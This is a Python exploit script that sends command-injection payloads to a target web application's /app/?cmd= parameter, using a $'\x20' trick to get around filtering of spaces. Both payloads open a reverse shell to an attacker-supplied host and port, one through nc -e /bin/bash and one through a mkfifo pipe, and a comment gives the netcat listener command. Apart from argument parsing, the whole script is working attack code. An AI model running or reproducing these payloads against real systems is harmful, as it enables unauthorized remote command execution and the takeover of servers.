#!/usr/bin/env python3 
from argparse import ArgumentParser
import urllib.request as urlreq
import sys

parser = ArgumentParser()
parser.add_argument("-t",  required=True, help=("Target"))
parser.add_argument("-lp", help=("Local port for reverse shell. Default=31337"), default='31337')
parser.add_argument("-lh", required=True, help=("Local host for reverse shell"))
parser.add_argument("-r",  choices=['nc', 'ncnoe'], default='ncnoe', help=("type of reverse shell"))
args = parser.parse_args()

h =  args.t
lhost = args.lh
lport = args.lp

#run a $nc -lvp 31337 on lhost;
nc_rev = "s=$'%5cx20';ls$s-ls;/usr/bin/nc$s\"" + lhost + "\"$s\"" + lport + "\"$s-e$s\"/bin/bash\"&key[]=%27%27"
nc_noe = "s=$'%5Cx20';ls$s-la;rm$s-rf$s/tmp/bkp;mkfifo$s/tmp/bkp;/bin/bash$s0</tmp/bkp|nc$s\"" + lhost + "\"$s\"" + lport + "\"$s1>/tmp/bkp"

if args.r == 'nc': 
    url = "http://" + h + "/app/?cmd=" + nc_rev + "&key[]=%27%27"
    resp = urlreq.urlopen(url)
elif args.r == 'ncnoe':
    url = "http://" + h + "/app/?cmd=" + nc_noe + "&key[]=%27%27"
    resp = urlreq.urlopen(url)
